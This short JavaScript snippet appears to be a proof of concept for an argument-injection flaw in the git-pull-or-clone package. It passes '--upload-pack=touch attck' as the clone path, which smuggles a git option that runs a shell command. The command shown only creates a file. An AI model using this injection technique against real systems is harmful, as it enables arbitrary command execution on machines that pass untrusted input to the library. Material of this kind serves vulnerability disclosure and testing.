const gitPullOrClone = require('git-pull-or-clone')
const repo = 'file:///tmp/zero12345'
const path = '--upload-pack=touch attck'
gitPullOrClone(repo, path, (err) => {
  if (err) throw err
  console.log('SUCCESS!')
})
